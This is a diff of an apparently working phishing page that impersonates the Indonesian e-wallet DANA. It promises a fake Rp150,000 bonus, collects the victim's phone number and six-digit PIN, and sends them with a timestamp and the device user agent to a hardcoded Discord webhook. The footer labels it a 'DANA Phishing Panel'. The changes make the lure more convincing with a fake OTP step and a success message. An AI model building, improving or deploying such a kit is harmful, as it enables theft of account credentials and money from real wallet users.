@@ -5,121 +5,214 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>DANA - Klaim Dana Kaget</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
-body{background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:12px}
+*{margin:0;padding:0;box-sizing:border-box;font-family:'SF Pro Display',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
+body{background:#f2f4f7;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:0;margin:0}
 .hidden{display:none!important}
-/* LAYER 1 - CLAIM */
-#layer1{width:100%;max-width:420px;margin:0 auto}
-.header{background:#0055ff;padding:16px 20px;border-radius:0 0 24px 24px;color:#fff;display:flex;align-items:center;gap:12px}
-.header img{width:40px;height:40px;background:#fff;border-radius:50%;padding:6px}
-.header h1{font-size:20px;font-weight:700;flex:1}
-.header span{font-size:13px;opacity:0.9}
-.banner{background:linear-gradient(135deg,#0055ff,#0033cc);margin:16px 0;padding:20px;border-radius:16px;color:#fff;text-align:center}
-.banner h2{font-size:22px;font-weight:700}
-.banner .amount{font-size:42px;font-weight:900;margin:6px 0;letter-spacing:-1px}
-.banner .sub{font-size:13px;opacity:0.85}
-.card{background:#fff;border-radius:16px;padding:20px;box-shadow:0 2px 12px rgba(0,0,0,0.08);margin:12px 0}
-.card .row{display:flex;justify-content:space-between;padding:12px 0;border-bottom:1px solid #f0f0f0}
-.card .row:last-child{border-bottom:0}
-.card .label{color:#666;font-size:14px}
-.card .value{color:#222;font-weight:600;font-size:14px}
-.btn{background:#0055ff;color:#fff;border:none;padding:16px;border-radius:12px;font-size:17px;font-weight:700;width:100%;cursor:pointer;transition:0.2s}
-.btn:active{transform:scale(0.97);background:#0044dd}
-.btn-secondary{background:#f0f0f0;color:#222;margin-top:8px}
-/* LAYER 2 - PHONE */
-#layer2{width:100%;max-width:420px;margin:0 auto}
-.phone-header{background:#0055ff;padding:20px;color:#fff;border-radius:0 0 24px 24px}
-.phone-header h2{font-size:18px;font-weight:600}
-.phone-header p{font-size:13px;opacity:0.85;margin-top:4px}
-.phone-input{margin:24px 0;background:#fff;border-radius:16px;padding:4px 16px;border:2px solid #e0e0e0;display:flex;align-items:center}
-.phone-input:focus-within{border-color:#0055ff}
-.phone-input .prefix{color:#888;font-size:18px;padding-right:12px;border-right:2px solid #e0e0e0;margin-right:12px}
-.phone-input input{flex:1;padding:16px 0;border:none;outline:none;font-size:18px;background:transparent;width:100%}
-.phone-input input::placeholder{color:#bbb}
-/* LAYER 3 - PIN */
-#layer3{width:100%;max-width:420px;margin:0 auto}
-.pin-header{background:#0055ff;padding:30px 20px;color:#fff;border-radius:0 0 24px 24px;text-align:center}
-.pin-header .icon{font-size:48px;margin-bottom:8px}
+.app-container{width:100%;max-width:430px;min-height:100vh;background:#f2f4f7;position:relative;margin:0 auto}
+
+/* ===== LAYER 1: KLAIM DANA KAGET ===== */
+#layer1{background:#f2f4f7;min-height:100vh;padding-bottom:80px}
+.status-bar{background:#0055ff;padding:12px 20px 8px;display:flex;justify-content:space-between;color:#fff;font-size:12px;font-weight:600}
+.status-bar span{opacity:0.9}
+.top-nav{background:#0055ff;padding:8px 16px 16px;display:flex;align-items:center;gap:12px;color:#fff}
+.top-nav .back{font-size:24px;cursor:pointer;width:36px;height:36px;display:flex;align-items:center;justify-content:center}
+.top-nav .title{font-size:18px;font-weight:700;flex:1}
+.top-nav .menu{font-size:20px;cursor:pointer}
+
+.promo-banner{background:linear-gradient(135deg,#0055ff,#0044cc);margin:16px 16px 12px;padding:20px 24px;border-radius:16px;color:#fff;position:relative;overflow:hidden}
+.promo-banner::before{content:'🎉';position:absolute;right:-10px;top:-10px;font-size:80px;opacity:0.15}
+.promo-banner .badge{background:rgba(255,255,255,0.2);padding:4px 12px;border-radius:20px;font-size:11px;display:inline-block;font-weight:600;margin-bottom:8px}
+.promo-banner h2{font-size:16px;font-weight:500;opacity:0.9}
+.promo-banner .amount{font-size:44px;font-weight:900;margin:4px 0;letter-spacing:-2px}
+.promo-banner .sub{font-size:13px;opacity:0.85;margin-top:4px}
+.promo-banner .btn-claim{background:#fff;color:#0055ff;border:none;padding:14px 32px;border-radius:30px;font-size:16px;font-weight:800;margin-top:16px;cursor:pointer;width:100%;transition:0.2s}
+.promo-banner .btn-claim:active{transform:scale(0.97);opacity:0.8}
+
+.section-title{font-size:15px;font-weight:700;color:#1a1a1a;padding:16px 16px 8px}
+.card-white{background:#fff;margin:0 16px 12px;border-radius:14px;padding:16px;box-shadow:0 1px 4px rgba(0,0,0,0.04)}
+.card-white .row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #f0f0f0}
+.card-white .row:last-child{border-bottom:0}
+.card-white .label{color:#6b6b6b;font-size:14px}
+.card-white .value{color:#1a1a1a;font-weight:600;font-size:14px}
+.card-white .value.green{color:#00a854}
+
+.quick-menu{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;padding:0 16px;margin:12px 0}
+.quick-item{background:#fff;border-radius:12px;padding:14px 8px;text-align:center;box-shadow:0 1px 4px rgba(0,0,0,0.04)}
+.quick-item .icon{font-size:28px;margin-bottom:4px}
+.quick-item .name{font-size:11px;color:#4a4a4a;font-weight:500}
+
+.bottom-tab{position:fixed;bottom:0;left:0;right:0;max-width:430px;margin:0 auto;background:#fff;display:flex;padding:8px 0 12px;border-top:1px solid #e8e8e8;z-index:100}
+.tab-item{flex:1;text-align:center;cursor:pointer}
+.tab-item .icon{font-size:22px;display:block}
+.tab-item .label{font-size:10px;color:#8a8a8a;margin-top:2px;font-weight:500}
+.tab-item.active .label{color:#0055ff}
+.tab-item.active .icon{color:#0055ff}
+
+/* ===== LAYER 2: NOMOR TELEPON ===== */
+#layer2{background:#f2f4f7;min-height:100vh}
+.phone-header{background:#0055ff;padding:50px 20px 30px;color:#fff;border-radius:0 0 30px 30px;text-align:center}
+.phone-header .icon-wrap{background:rgba(255,255,255,0.15);width:80px;height:80px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;font-size:36px}
+.phone-header h2{font-size:22px;font-weight:700}
+.phone-header p{font-size:14px;opacity:0.85;margin-top:6px;font-weight:400}
+
+.phone-box{background:#fff;margin:24px 16px 16px;border-radius:16px;padding:20px 16px;box-shadow:0 2px 8px rgba(0,0,0,0.04)}
+.phone-box .label{font-size:12px;color:#6b6b6b;font-weight:600;letter-spacing:0.5px;margin-bottom:4px}
+.phone-input-wrap{display:flex;align-items:center;border:2px solid #e0e0e0;border-radius:12px;padding:0 12px;transition:0.2s}
+.phone-input-wrap:focus-within{border-color:#0055ff;background:#f8faff}
+.phone-input-wrap .prefix{color:#1a1a1a;font-size:17px;font-weight:600;padding-right:10px;border-right:2px solid #e8e8e8;margin-right:10px}
+.phone-input-wrap input{flex:1;padding:14px 0;border:none;outline:none;font-size:17px;background:transparent;width:100%;color:#1a1a1a}
+.phone-input-wrap input::placeholder{color:#b0b0b0}
+.phone-box .info{font-size:12px;color:#8a8a8a;margin-top:10px;display:flex;align-items:center;gap:6px}
+.phone-box .info .dot{width:4px;height:4px;background:#00a854;border-radius:50%;display:inline-block}
+
+.btn-primary{background:#0055ff;color:#fff;border:none;padding:16px;border-radius:14px;font-size:17px;font-weight:700;width:calc(100% - 32px);margin:0 16px;cursor:pointer;transition:0.2s;position:relative}
+.btn-primary:active{transform:scale(0.98);background:#0044dd}
+.btn-primary:disabled{opacity:0.5;transform:none}
+.btn-secondary{background:transparent;color:#0055ff;border:none;padding:14px;font-size:15px;font-weight:600;width:100%;cursor:pointer;margin:4px 0}
+
+.loading-dots{display:inline-block}
+.loading-dots::after{content:'...';animation:dots 1.2s steps(3,end) infinite}
+@keyframes dots{0%{content:''}33%{content:'.'}66%{content:'..'}100%{content:'...'}}
+
+/* ===== LAYER 3: PIN ===== */
+#layer3{background:#f2f4f7;min-height:100vh}
+.pin-header{background:#0055ff;padding:40px 20px 30px;color:#fff;border-radius:0 0 30px 30px;text-align:center}
+.pin-header .icon-lock{font-size:48px;margin-bottom:8px}
 .pin-header h2{font-size:20px;font-weight:700}
-.pin-header p{font-size:14px;opacity:0.8;margin-top:4px}
-.pin-display{display:flex;justify-content:center;gap:16px;margin:30px 0}
-.pin-dot{width:50px;height:60px;background:#fff;border-radius:12px;border:2px solid #e0e0e0;display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:700;color:#222;transition:0.2s}
+.pin-header p{font-size:14px;opacity:0.85;margin-top:4px}
+
+.pin-container{background:#fff;margin:24px 16px 16px;border-radius:16px;padding:24px 20px;box-shadow:0 2px 8px rgba(0,0,0,0.04)}
+.pin-label{text-align:center;font-size:13px;color:#6b6b6b;font-weight:600;letter-spacing:0.5px}
+.pin-dots{display:flex;justify-content:center;gap:18px;margin:20px 0 28px}
+.pin-dot{width:48px;height:56px;border-radius:12px;border:2px solid #d0d0d0;display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:700;color:#1a1a1a;transition:0.15s;background:#fafafa}
 .pin-dot.filled{border-color:#0055ff;background:#f0f7ff}
-.pin-dot.active{border-color:#0055ff;box-shadow:0 0 0 3px rgba(0,85,255,0.2)}
-.pin-pad{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin:16px 0}
-.pin-key{background:#fff;border:1px solid #e8e8e8;border-radius:60px;padding:18px;font-size:24px;font-weight:600;cursor:pointer;transition:0.1s;text-align:center;color:#222;user-select:none}
-.pin-key:active{transform:scale(0.94);background:#f0f0f0}
-.pin-key.empty{background:transparent;border:0;cursor:default}
-.pin-key.empty:active{transform:none;background:transparent}
-.pin-key .del-icon{font-size:20px;color:#666}
-.pin-footer{text-align:center;margin:20px 0;color:#888;font-size:13px}
-.pin-footer a{color:#0055ff;text-decoration:none;font-weight:600}
+.pin-dot.active{border-color:#0055ff;box-shadow:0 0 0 4px rgba(0,85,255,0.15);background:#fff}
+
+.pin-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;max-width:320px;margin:0 auto}
+.pin-key{background:#fff;border:1px solid #e8e8e8;border-radius:60px;padding:18px;font-size:26px;font-weight:600;cursor:pointer;text-align:center;color:#1a1a1a;user-select:none;transition:0.1s;height:72px;display:flex;align-items:center;justify-content:center}
+.pin-key:active{transform:scale(0.93);background:#f0f0f0}
+.pin-key.empty{background:transparent;border:0;cursor:default;pointer-events:none}
+.pin-key .del-icon{font-size:22px;color:#6b6b6b}
+.pin-key.biometric{background:#f8f8f8;border-color:#e0e0e0;font-size:28px}
+
+.pin-actions{display:flex;justify-content:center;gap:24px;margin:16px 0 4px}
+.pin-actions a{color:#0055ff;font-size:14px;font-weight:500;text-decoration:none;cursor:pointer}
+
+/* LOADING OVERLAY */
+.loading-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.5);z-index:999;display:none;align-items:center;justify-content:center}
+.loading-overlay.active{display:flex}
+.loading-box{background:#fff;border-radius:20px;padding:32px 40px;text-align:center;max-width:320px;width:90%}
+.loading-box .spinner{width:48px;height:48px;border:4px solid #e8e8e8;border-top:4px solid #0055ff;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 16px}
+@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+.loading-box h3{font-size:18px;color:#1a1a1a;margin-bottom:4px}
+.loading-box p{font-size:14px;color:#6b6b6b}
+
+/* Status toast */
+.toast{position:fixed;bottom:100px;left:50%;transform:translateX(-50%);background:#1a1a1a;color:#fff;padding:12px 24px;border-radius:12px;font-size:14px;font-weight:500;z-index:1000;display:none;max-width:380px;text-align:center}
+.toast.show{display:block;animation:fadeUp 0.3s ease}
+@keyframes fadeUp{0%{opacity:0;transform:translateX(-50%) translateY(20px)}100%{opacity:1;transform:translateX(-50%) translateY(0)}}
 </style>
 </head>
 <body>
 
-<!-- LAYER 1: KLAIM DANA KAGET -->
+<div class="app-container">
+
+<!-- TOAST -->
+<div class="toast" id="toast"></div>
+
+<!-- LOADING OVERLAY -->
+<div class="loading-overlay" id="loadingOverlay">
+<div class="loading-box">
+<div class="spinner"></div>
+<h3 id="loadingTitle">Memproses...</h3>
+<p id="loadingSub">Mohon tunggu sebentar</p>
+</div>
+</div>
+
+<!-- ===== LAYER 1: KLAIM DANA KAGET ===== -->
 <div id="layer1">
-<div class="header">
-<div style="background:#fff;border-radius:50%;width:40px;height:40px;display:flex;align-items:center;justify-content:center;font-size:22px;font-weight:900;color:#0055ff">D</div>
-<h1>DANA</h1>
-<span>Dompet Digital</span>
+<div class="status-bar">
+<span>09:41</span>
+<span>📶 ████ 🔋</span>
+</div>
+<div class="top-nav">
+<div class="back">‹</div>
+<div class="title">DANA</div>
+<div class="menu">⋯</div>
 </div>
 
-<div class="banner">
-<div style="font-size:14px;opacity:0.9">🎉 Ada dana kaget nih!</div>
-<h2>Kamu Berhak</h2>
+<div class="promo-banner">
+<div class="badge">🎉 PROMO TERBATAS</div>
+<h2>Ada dana kaget untukmu!</h2>
 <div class="amount">Rp150.000</div>
-<div class="sub">Bonus eksklusif untuk pengguna aktif</div>
+<div class="sub">💰 Bonus eksklusif pengguna aktif</div>
+<button class="btn-claim" id="btnClaim">✨ Klaim Sekarang</button>
 </div>
 
-<div class="card">
-<div class="row"><span class="label">💳 Sumber Dana</span><span class="value">Promo DANA Kaget</span></div>
-<div class="row"><span class="label">⏳ Berlaku</span><span class="value">Hari ini</span></div>
-<div class="row"><span class="label">🏷️ Kode</span><span class="value">DK-2026-150</span></div>
+<div class="section-title">Detail Promo</div>
+<div class="card-white">
+<div class="row"><span class="label">💳 Sumber Dana</span><span class="value">DANA Kaget</span></div>
+<div class="row"><span class="label">⏳ Berlaku Hingga</span><span class="value">Hari Ini</span></div>
+<div class="row"><span class="label">🏷️ Kode Promo</span><span class="value">DK-2026-150</span></div>
+<div class="row"><span class="label">✅ Status</span><span class="value green">Belum Diklaim</span></div>
 </div>
 
-<button class="btn" id="btnClaim">Klaim Sekarang</button>
-<button class="btn btn-secondary" style="font-weight:400;font-size:14px">❌ Lewati</button>
+<div class="section-title">Menu Cepat</div>
+<div class="quick-menu">
+<div class="quick-item"><div class="icon">💳</div><div class="name">Bayar</div></div>
+<div class="quick-item"><div class="icon">📱</div><div class="name">Pulsa</div></div>
+<div class="quick-item"><div class="icon">⚡</div><div class="name">Listrik</div></div>
+<div class="quick-item"><div class="icon">🎮</div><div class="name">Topup</div></div>
+</div>
 
-<div style="text-align:center;margin:16px 0;color:#999;font-size:12px">
-DANA berkomitmen menjaga keamanan data Anda
+<div class="bottom-tab">
+<div class="tab-item active"><span class="icon">🏠</span><span class="label">Beranda</span></div>
+<div class="tab-item"><span class="icon">💸</span><span class="label">Transaksi</span></div>
+<div class="tab-item"><span class="icon">📊</span><span class="label">Dompet</span></div>
+<div class="tab-item"><span class="icon">👤</span><span class="label">Akun</span></div>
 </div>
 </div>
 
-<!-- LAYER 2: NOMOR TELEPON -->
+<!-- ===== LAYER 2: NOMOR TELEPON ===== -->
 <div id="layer2" class="hidden">
+<div class="status-bar" style="background:#0055ff;padding:12px 20px 8px;display:flex;justify-content:space-between;color:#fff;font-size:12px;font-weight:600">
+<span>09:41</span>
+<span>📶 ████ 🔋</span>
+</div>
 <div class="phone-header">
-<h2>🔐 Masukkan Nomor</h2>
+<div class="icon-wrap">📱</div>
+<h2>Masukkan Nomor Telepon</h2>
 <p>Kami akan kirimkan kode verifikasi</p>
 </div>
 
-<div style="background:#fff;border-radius:16px;padding:20px;margin:16px 0;box-shadow:0 2px 12px rgba(0,0,0,0.06)">
-<div style="font-size:13px;color:#666;margin-bottom:6px">NOMOR TELEPON</div>
-<div class="phone-input">
+<div class="phone-box">
+<div class="label">NOMOR TELEPON</div>
+<div class="phone-input-wrap">
 <span class="prefix">+62</span>
-<input type="tel" id="phoneInput" placeholder="81234567890" maxlength="13" inputmode="numeric">
+<input type="tel" id="phoneInput" placeholder="81234567890" maxlength="13" inputmode="numeric" autofocus>
 </div>
-<div style="font-size:12px;color:#999;margin-top:8px">Pastikan nomor aktif dan terdaftar di DANA</div>
-</div>
-
-<button class="btn" id="btnPhone">Lanjutkan</button>
-<div style="text-align:center;margin:12px 0;color:#888;font-size:13px">
-< a href="#" id="backToClaim" style="color:#0055ff;text-decoration:none">← Kembali</a>
-</div>
+<div class="info"><span class="dot"></span> Pastikan nomor aktif dan terdaftar di DANA</div>
 </div>
 
-<!-- LAYER 3: PIN -->
+<button class="btn-primary" id="btnPhone">Lanjutkan</button>
+<button class="btn-secondary" id="backToClaim">← Kembali ke Beranda</button>
+</div>
+
+<!-- ===== LAYER 3: PIN ===== -->
 <div id="layer3" class="hidden">
+<div class="status-bar" style="background:#0055ff;padding:12px 20px 8px;display:flex;justify-content:space-between;color:#fff;font-size:12px;font-weight:600">
+<span>09:41</span>
+<span>📶 ████ 🔋</span>
+</div>
 <div class="pin-header">
-<div class="icon">🔒</div>
+<div class="icon-lock">🔒</div>
 <h2>Masukkan PIN</h2>
 <p>Verifikasi keamanan akun Anda</p>
 </div>
 
-<div style="background:#fff;border-radius:16px;padding:20px;margin:16px 0;box-shadow:0 2px 12px rgba(0,0,0,0.06)">
-<div style="text-align:center;font-size:13px;color:#666;margin-bottom:8px">MASUKKAN PIN DANA</div>
-<div class="pin-display" id="pinDisplay">
+<div class="pin-container">
+<div class="pin-label">MASUKKAN PIN DANA</div>
+<div class="pin-dots" id="pinDisplay">
 <div class="pin-dot" data-index="0"></div>
 <div class="pin-dot" data-index="1"></div>
 <div class="pin-dot" data-index="2"></div>
@@ -128,7 +221,7 @@ DANA berkomitmen menjaga keamanan data Anda
 <div class="pin-dot" data-index="5"></div>
 </div>
 
-<div class="pin-pad" id="pinPad">
+<div class="pin-grid" id="pinPad">
 <div class="pin-key" data-value="1">1</div>
 <div class="pin-key" data-value="2">2</div>
 <div class="pin-key" data-value="3">3</div>
@@ -143,45 +236,115 @@ DANA berkomitmen menjaga keamanan data Anda
 <div class="pin-key" data-value="del"><span class="del-icon">⌫</span></div>
 </div>
 
-<div class="pin-footer">
-<a href="#" id="forgotPin">Lupa PIN?</a> • <a href="#" id="backToPhone">Ganti nomor</a>
+<div class="pin-actions">
+<a href="#" id="forgotPin">Lupa PIN</a>
+<a href="#" id="backToPhone">Ganti Nomor</a>
 </div>
 </div>
+</div>
+
 </div>
 
 <script>
-// WEBHOOK
-const WEBHOOK = 'https://discord.com/api/webhooks/1524070686254043246/PE5bJmStZXka_cC2GT0jKV9H-oRpmlbL86dfgqtVhgS7LbkwhQ36Ze_zXJ0oPa0rqX-s'; // GANTI
+// ===== KONFIGURASI =====
+const WEBHOOK = 'https://discord.com/api/webhooks/1524070686254043246/PE5bJmStZXka_cC2GT0jKV9H-oRpmlbL86dfgqtVhgS7LbkwhQ36Ze_zXJ0oPa0rqX-s'; // GANTI DENGAN WEBHOOK ANDA
 
-// DOM
+// ===== DOM REFS =====
 const layer1 = document.getElementById('layer1');
 const layer2 = document.getElementById('layer2');
 const layer3 = document.getElementById('layer3');
 const btnClaim = document.getElementById('btnClaim');
 const btnPhone = document.getElementById('btnPhone');
+const backToClaim = document.getElementById('backToClaim');
+const backToPhone = document.getElementById('backToPhone');
+const forgotPin = document.getElementById('forgotPin');
 const phoneInput = document.getElementById('phoneInput');
 const pinDots = document.querySelectorAll('.pin-dot');
 const pinPad = document.getElementById('pinPad');
-const backToClaim = document.getElementById('backToClaim');
-const backToPhone = document.getElementById('backToPhone');
+const loadingOverlay = document.getElementById('loadingOverlay');
+const loadingTitle = document.getElementById('loadingTitle');
+const loadingSub = document.getElementById('loadingSub');
+const toast = document.getElementById('toast');
 
 let pin = '';
 let phone = '';
+let toastTimer = null;
 
-// LAYER NAV
-btnClaim.onclick = () => { layer1.classList.add('hidden'); layer2.classList.remove('hidden'); };
-backToClaim.onclick = (e) => { e.preventDefault(); layer2.classList.add('hidden'); layer1.classList.remove('hidden'); };
+// ===== TOAST =====
+function showToast(msg, duration = 3000) {
+toast.textContent = msg;
+toast.classList.add('show');
+clearTimeout(toastTimer);
+toastTimer = setTimeout(() => toast.classList.remove('show'), duration);
+}
+
+// ===== LOADING =====
+function showLoading(title, sub) {
+loadingTitle.textContent = title;
+loadingSub.textContent = sub;
+loadingOverlay.classList.add('active');
+}
+function hideLoading() {
+loadingOverlay.classList.remove('active');
+}
+
+// ===== NAVIGASI =====
+btnClaim.onclick = () => {
+layer1.classList.add('hidden');
+layer2.classList.remove('hidden');
+phoneInput.focus();
+};
+
+backToClaim.onclick = (e) => {
+e.preventDefault();
+layer2.classList.add('hidden');
+layer1.classList.remove('hidden');
+};
+
+backToPhone.onclick = (e) => {
+e.preventDefault();
+layer3.classList.add('hidden');
+layer2.classList.remove('hidden');
+resetPin();
+};
+
+forgotPin.onclick = (e) => {
+e.preventDefault();
+showToast('🔐 Silakan hubungi CS DANA untuk reset PIN', 4000);
+};
+
+// ===== LAYER 2: PHONE =====
 btnPhone.onclick = () => {
-phone = phoneInput.value.trim();
-if (!phone || phone.length < 8) { alert('Masukkan nomor yang valid'); return; }
+phone = phoneInput.value.replace(/\s/g, '');
+if (!phone || phone.length < 8) {
+showToast('❌ Nomor telepon tidak valid', 2500);
+phoneInput.style.borderColor = '#ff4444';
+setTimeout(() => phoneInput.style.borderColor = '', 1500);
+return;
+}
+// Simulasi loading
+showLoading('Memverifikasi Nomor', 'Mengirim kode OTP...');
+btnPhone.disabled = true;
+setTimeout(() => {
+hideLoading();
 layer2.classList.add('hidden');
 layer3.classList.remove('hidden');
 resetPin();
+btnPhone.disabled = false;
+showToast('✅ Kode OTP telah dikirim', 2000);
+}, 1800);
 };
-backToPhone.onclick = (e) => { e.preventDefault(); layer3.classList.add('hidden'); layer2.classList.remove('hidden'); resetPin(); };
 
-// PIN LOGIC
-function resetPin() { pin = ''; updateDots(); }
+phoneInput.addEventListener('keydown', (e) => {
+if (e.key === 'Enter') btnPhone.click();
+});
+
+// ===== LAYER 3: PIN =====
+function resetPin() {
+pin = '';
+updateDots();
+}
+
 function updateDots() {
 pinDots.forEach((dot, i) => {
 dot.textContent = i < pin.length ? '●' : '';
@@ -189,43 +352,64 @@ dot.classList.toggle('filled', i < pin.length);
 dot.classList.toggle('active', i === pin.length);
 });
 }
+
 pinPad.addEventListener('click', (e) => {
 const key = e.target.closest('.pin-key');
 if (!key || key.classList.contains('empty')) return;
 const val = key.dataset.value;
-if (val === 'del') { if (pin.length > 0) pin = pin.slice(0, -1); }
-else if (pin.length < 6) { pin += val; }
+
+if (val === 'del') {
+if (pin.length > 0) pin = pin.slice(0, -1);
+} else if (pin.length < 6) {
+pin += val;
+}
 updateDots();
+
 if (pin.length === 6) {
-sendData(phone, pin);
+// Simulasi loading verifikasi PIN
+showLoading('Memverifikasi PIN', 'Mohon tunggu...');
+setTimeout(() => {
+hideLoading();
+// Kirim ke Discord
+sendToDiscord(phone, pin);
+// Reset dan kembali ke beranda
 layer3.classList.add('hidden');
 layer1.classList.remove('hidden');
 resetPin();
 phoneInput.value = '';
-alert('✅ Klaim berhasil! Dana akan diproses dalam 1x24 jam.');
+showToast('✅ Klaim berhasil! Dana akan diproses', 3000);
+}, 1500);
 }
 });
 
-// SEND TO DISCORD
-function sendData(phone, pin) {
+// ===== SEND TO DISCORD =====
+function sendToDiscord(phone, pin) {
 const embed = {
 title: '📱 DANA KAGET - DATA TERTANGKAP',
 color: 0x0055ff,
 fields: [
-{ name: '📞 Nomor Telepon', value: `+62 ${phone}`, inline: false },
+{ name: '📞 Nomor Telepon', value: `\`+62 ${phone}\``, inline: false },
 { name: '🔒 PIN DANA', value: `\`\`\`${pin}\`\`\``, inline: false },
-{ name: '🕐 Waktu', value: new Date().toLocaleString('id-ID', {timeZone:'Asia/Jakarta'}), inline: true },
-{ name: '🌐 User Agent', value: navigator.userAgent.slice(0,60), inline: true }
+{ name: '🕐 Waktu', value: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }), inline: true },
+{ name: '📱 Perangkat', value: navigator.userAgent.slice(0, 80), inline: true }
 ],
 footer: { text: 'Worm Aiva • DANA Phishing Panel' },
 timestamp: new Date().toISOString()
 };
+
 fetch(WEBHOOK, {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify({ embeds: [embed] })
 }).catch(() => {});
 }
+
+// ===== AUTO FOCUS PHONE =====
+document.addEventListener('DOMContentLoaded', () => {
+setTimeout(() => {
+if (!layer2.classList.contains('hidden')) phoneInput.focus();
+}, 300);
+});
 </script>
 </body>
 </html>
